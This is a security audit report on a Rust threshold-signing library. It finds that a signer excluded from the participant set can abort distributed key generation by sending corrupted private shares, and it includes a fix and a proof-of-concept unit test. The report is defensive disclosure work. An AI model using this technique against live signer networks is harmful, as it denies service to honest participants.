# Audit Report

## Title
Non-Participating Signers Can Abort DKG Through Invalid Private Shares

## Summary
The `dkg_ended()` function fails the entire DKG round when `invalid_private_shares` contains entries from non-participating signers, allowing a single malicious signer to DoS the DKG process by sending corrupted private shares while avoiding inclusion in the coordinator's final participant list.

## Finding Description

The vulnerability exists in the signer's `dkg_ended()` function where the decision to compute secrets checks if `invalid_private_shares` is completely empty without filtering by the final participating signer set. [1](#0-0) 

The attack exploits a mismatch between validation scope and the failure condition:

1. **Signer exclusion from participating set**: The FIRE coordinator's `start_private_shares()` only includes signers who successfully provided public shares in `DkgPrivateBegin.signer_ids`: [2](#0-1) 

2. **Unrestricted private share acceptance**: The signer's `dkg_private_shares()` handler accepts private shares from ANY configured signer, with no validation against the expected participating set: [3](#0-2) 

3. **Invalid share tracking**: When decryption fails due to corrupted data, the sender is added to `invalid_private_shares`: [4](#0-3) 

4. **Final participant set determination**: The coordinator's `start_dkg_end()` sends `DkgEndBegin` with `signer_ids` derived from `dkg_private_shares.keys()`, which excludes the malicious signer: [5](#0-4) 

5. **Inconsistent validation**: In `dkg_ended()`, the validation loop correctly filters by the coordinator-provided `signer_ids_set`: [6](#0-5) 

However, line 611 uses the unfiltered `invalid_private_shares` map: [7](#0-6) 

This breaks the security guarantee that DKG should complete successfully when sufficient honest signers have valid shares, even in the presence of non-participating malicious signers.

## Impact Explanation

**Severity: Low** - This vulnerability maps to "Any remotely-exploitable denial of service in a node."

**Concrete Impact:**
- DKG cannot complete, preventing establishment of threshold signing keys
- All honest signers report `DkgStatus::Failure`, forcing the coordinator to abort
- The system must retry DKG to proceed to the signing phase
- Affects all DKG participants in the current round

**Attack Scenario**: With 10 signers (threshold=7):
1. Malicious Signer A doesn't send `DkgPublicShares` (excluded from participating set)
2. Signer A sends corrupted `DkgPrivateShares` to other signers via P2P
3. All 9 honest signers add Signer A to `invalid_private_shares` due to decryption failure
4. Coordinator sends `DkgEndBegin` with only the 9 honest signers
5. Despite having 9 valid participants (exceeding threshold of 7), all report failure due to unfiltered check
6. DKG aborts and must be restarted

The coordinator's `gather_dkg_end()` attempts to verify BadPrivateShares claims, but compounds the issue by marking honest reporters as malicious when the accused signer has no public shares: [8](#0-7) 

The severity is Low (not higher) because:
- No cryptographic security compromise occurs
- No funds are at risk
- System can recover by retrying DKG
- Attack is detectable through coordinator reporting

## Likelihood Explanation

**Likelihood: High**

**Attacker Capabilities:**
- Control of a single configured signer (within threshold-1, part of normal FROST threat model)
- Ability to send network messages during DKG private share phase
- No cryptographic capabilities or key compromise needed

**Attack Complexity: Low**
- Send corrupted `DkgPrivateShares` with malformed ciphertext (random bytes)
- Optionally avoid sending `DkgPublicShares` to ensure exclusion from participating set
- No deep protocol understanding required

**Economic Feasibility:**
- Minimal cost: only network bandwidth for malformed messages
- Attack repeatable at negligible cost

**Success Probability:**
- 100% success rate if attacker controls any configured signer
- No existing mitigation prevents the attack in the current round

## Recommendation

Filter `invalid_private_shares` to only include signers from the final participating set before checking for DKG completion:

```rust
// In dkg_ended() after line 609, replace line 611 with:
let filtered_invalid_shares: HashMap<_, _> = self.invalid_private_shares
    .iter()
    .filter(|(signer_id, _)| signer_ids_set.contains(signer_id))
    .map(|(k, v)| (*k, v.clone()))
    .collect();

let dkg_end = if filtered_invalid_shares.is_empty() {
    // proceed with compute_secrets...
} else {
    DkgEnd {
        dkg_id: self.dkg_id,
        signer_id: self.signer_id,
        status: DkgStatus::Failure(DkgFailure::BadPrivateShares(
            filtered_invalid_shares,
        )),
    }
};
```

Additionally, the `dkg_private_shares()` handler should validate that the sender is in the expected participating set from `DkgPrivateBegin.signer_ids` before processing shares.

## Proof of Concept

```rust
#[test]
fn non_participating_signer_aborts_dkg() {
    use crate::v2;
    let mut rng = create_rng();
    
    // Setup: 3 signers, threshold 2
    let mut signers = Vec::new();
    let mut public_keys = PublicKeys::default();
    
    for i in 0..3 {
        let private_key = Scalar::random(&mut rng);
        let public_key = ecdsa::PublicKey::new(&private_key).unwrap();
        public_keys.signers.insert(i, public_key);
        public_keys.key_ids.insert(i, public_key);
        let mut key_ids = HashSet::new();
        key_ids.insert(i);
        public_keys.signer_key_ids.insert(i, key_ids);
        
        let mut signer = Signer::<v2::Signer>::new(
            2, 2, 3, 3, i, vec![i], private_key, public_keys.clone(), &mut rng
        ).unwrap();
        signer.verify_packet_sigs = false;
        signers.push(signer);
    }
    
    // Phase 1: Only signers 0 and 1 send DkgPublicShares (signer 2 doesn't participate)
    let dkg_begin = DkgBegin { dkg_id: 1 };
    for signer in &mut signers[0..2] {
        let _ = signer.dkg_begin(&dkg_begin, &mut rng).unwrap();
    }
    
    // Collect public shares
    for i in 0..2 {
        let public_shares = signers[i].dkg_public_begin(&mut rng).unwrap()[0].clone();
        if let Message::DkgPublicShares(shares) = public_shares {
            for j in 0..2 {
                let _ = signers[j].dkg_public_shares(&shares);
            }
        }
    }
    
    // Phase 2: Coordinator sends DkgPrivateBegin with only signers 0,1
    let private_begin = DkgPrivateBegin {
        dkg_id: 1,
        signer_ids: vec![0, 1], // signer 2 excluded
        key_ids: vec![],
    };
    
    for signer in &mut signers[0..2] {
        let _ = signer.dkg_private_begin(&private_begin, &mut rng).unwrap();
    }
    
    // Signers 0 and 1 exchange valid private shares
    for i in 0..2 {
        let private_shares = signers[i].dkg_private_begin(&private_begin, &mut rng).unwrap()[0].clone();
        if let Message::DkgPrivateShares(shares) = private_shares {
            for j in 0..2 {
                let _ = signers[j].dkg_private_shares(&shares, &mut rng).unwrap();
            }
        }
    }
    
    // ATTACK: Signer 2 (non-participating) sends corrupted private shares
    let corrupted_shares = DkgPrivateShares {
        dkg_id: 1,
        signer_id: 2,
        shares: vec![(2, vec![(0, vec![0u8; 32])].into_iter().collect())], // corrupted data
    };
    
    for signer in &mut signers[0..2] {
        let _ = signer.dkg_private_shares(&corrupted_shares, &mut rng); // Adds signer 2 to invalid_private_shares
    }
    
    // Phase 3: DkgEnd with only signers 0,1
    let end_begin = DkgEndBegin {
        dkg_id: 1,
        signer_ids: vec![0, 1], // signer 2 not included
        key_ids: vec![],
    };
    
    for signer in &mut signers[0..2] {
        let _ = signer.dkg_end_begin(&end_begin).unwrap();
        
        // VERIFY: dkg_ended() fails despite having sufficient valid participants
        let result = signer.dkg_ended(&mut rng).unwrap();
        if let Message::DkgEnd(dkg_end) = result {
            assert!(matches!(dkg_end.status, DkgStatus::Failure(DkgFailure::BadPrivateShares(_))));
        }
    }
}
```

This test demonstrates that honest signers 0 and 1 (meeting the threshold of 2) fail DKG due to invalid shares from non-participating signer 2, proving the vulnerability.

### Citations

**File:** src/state_machine/signer/mod.rs (L529-583)
```rust
        let signer_ids_set: HashSet<u32> = dkg_end_begin
            .signer_ids
            .iter()
            .filter(|&&id| id < self.total_signers)
            .copied()
            .collect::<HashSet<u32>>();
        let mut num_dkg_keys = 0u32;
        for id in &signer_ids_set {
            if let Some(key_ids) = self.public_keys.signer_key_ids.get(id) {
                let len: u32 = key_ids.len().try_into()?;
                num_dkg_keys = num_dkg_keys.saturating_add(len);
            }
        }

        if num_dkg_keys < self.dkg_threshold {
            return Ok(Message::DkgEnd(DkgEnd {
                dkg_id: self.dkg_id,
                signer_id: self.signer_id,
                status: DkgStatus::Failure(DkgFailure::Threshold),
            }));
        }

        for signer_id in &signer_ids_set {
            if let Some(shares) = self.dkg_public_shares.get(signer_id) {
                if shares.comms.is_empty() {
                    missing_public_shares.insert(*signer_id);
                } else {
                    for (party_id, comm) in shares.comms.iter() {
                        if !check_public_shares(comm, threshold, &self.dkg_id.to_be_bytes()) {
                            bad_public_shares.insert(*signer_id);
                        } else {
                            self.commitments.insert(*party_id, comm.clone());
                        }
                    }
                }
            } else {
                missing_public_shares.insert(*signer_id);
            }
            if let Some(shares) = self.dkg_private_shares.get(signer_id) {
                // signer_id sent shares, but make sure that it sent shares for every one of this signer's key_ids
                if shares.shares.is_empty() {
                    missing_private_shares.insert(*signer_id);
                } else {
                    for dst_key_id in self.signer.get_key_ids() {
                        for (_src_key_id, shares) in &shares.shares {
                            if shares.get(&dst_key_id).is_none() {
                                missing_private_shares.insert(*signer_id);
                            }
                        }
                    }
                }
            } else {
                missing_private_shares.insert(*signer_id);
            }
        }
```

**File:** src/state_machine/signer/mod.rs (L611-659)
```rust
        let dkg_end = if self.invalid_private_shares.is_empty() {
            match self.signer.compute_secrets(
                &self.decrypted_shares,
                &self.commitments,
                &self.dkg_id.to_be_bytes(),
            ) {
                Ok(()) => DkgEnd {
                    dkg_id: self.dkg_id,
                    signer_id: self.signer_id,
                    status: DkgStatus::Success,
                },
                Err(dkg_error_map) => {
                    // we've handled everything except BadPrivateShares and Point both of which should map to DkgFailure::BadPrivateShares
                    let mut bad_private_shares = HashMap::new();
                    for (_my_party_id, dkg_error) in dkg_error_map {
                        if let DkgError::BadPrivateShares(party_ids) = dkg_error {
                            for party_id in party_ids {
                                if let Some((party_signer_id, _shared_key)) =
                                    &self.decryption_keys.get(&party_id)
                                {
                                    bad_private_shares.insert(
                                        *party_signer_id,
                                        self.make_bad_private_share(*party_signer_id, rng)?,
                                    );
                                } else {
                                    warn!("DkgError::BadPrivateShares from party_id {party_id} but no (signer_id, shared_secret) cached");
                                }
                            }
                        } else {
                            warn!("Got unexpected dkg_error {dkg_error:?}");
                        }
                    }
                    DkgEnd {
                        dkg_id: self.dkg_id,
                        signer_id: self.signer_id,
                        status: DkgStatus::Failure(DkgFailure::BadPrivateShares(
                            bad_private_shares,
                        )),
                    }
                }
            }
        } else {
            DkgEnd {
                dkg_id: self.dkg_id,
                signer_id: self.signer_id,
                status: DkgStatus::Failure(DkgFailure::BadPrivateShares(
                    self.invalid_private_shares.clone(),
                )),
            }
```

**File:** src/state_machine/signer/mod.rs (L1037-1041)
```rust
        // check that the signer_id exists in the config
        let Some(_signer_public_key) = self.public_keys.signers.get(&src_signer_id) else {
            warn!(%src_signer_id, "No public key configured");
            return Ok(vec![]);
        };
```

**File:** src/state_machine/signer/mod.rs (L1083-1094)
```rust
                                self.invalid_private_shares.insert(
                                    src_signer_id,
                                    self.make_bad_private_share(src_signer_id, rng)?,
                                );
                            }
                        },
                        Err(e) => {
                            warn!("Failed to decrypt dkg private share from src_id {src_id} to dst_id {dst_key_id}: {e:?}");
                            self.invalid_private_shares.insert(
                                src_signer_id,
                                self.make_bad_private_share(src_signer_id, rng)?,
                            );
```

**File:** src/state_machine/coordinator/fire.rs (L432-435)
```rust
        let dkg_begin = DkgPrivateBegin {
            dkg_id: self.current_dkg_id,
            signer_ids: self.dkg_public_shares.keys().cloned().collect(),
            key_ids: vec![],
```

**File:** src/state_machine/coordinator/fire.rs (L461-465)
```rust
        let dkg_end_begin = DkgEndBegin {
            dkg_id: self.current_dkg_id,
            signer_ids: self.dkg_private_shares.keys().cloned().collect(),
            key_ids: vec![],
        };
```

**File:** src/state_machine/coordinator/fire.rs (L670-676)
```rust
                                let Some(bad_signer_public_shares) =
                                    self.dkg_public_shares.get(bad_signer_id)
                                else {
                                    warn!("Signer {signer_id} reported BadPrivateShares from {bad_signer_id} but there are no public shares from {bad_signer_id}, mark {signer_id} as malicious");
                                    malicious_signers.insert(*signer_id);
                                    continue;
                                };
```
